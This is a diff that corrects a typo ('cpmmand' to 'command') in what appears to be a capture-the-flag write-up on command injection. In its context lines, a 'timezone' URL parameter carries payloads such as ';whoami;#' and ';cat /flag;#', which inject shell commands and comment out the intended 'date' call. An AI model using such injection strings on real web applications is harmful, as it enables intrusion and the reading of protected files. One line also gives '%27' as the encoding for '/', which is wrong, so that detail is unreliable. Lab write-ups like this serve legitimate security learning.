@@ -139,7 +139,7 @@ http://challenge.localhost/?timezone=;whoami;#
 ## Resultant Command
 TZ=;
 root;
-#date    ## The date cpmmand is commented out
+#date    ## The date command is commented out
 ```
 
 While sending the request, we have to URI encode the `#` character with `%23`.
@@ -158,7 +158,7 @@ http://challenge.localhost/?timezone=;cat /flag;#
 ## Resultant Command
 TZ=;
 cat /flag;
-#date    ## The date cpmmand is commented out
+#date    ## The date command is commented out
 ```
 
 While sending the request, we have to URI encode the ` ` character with `%20`  and the `/` character with `%27`.
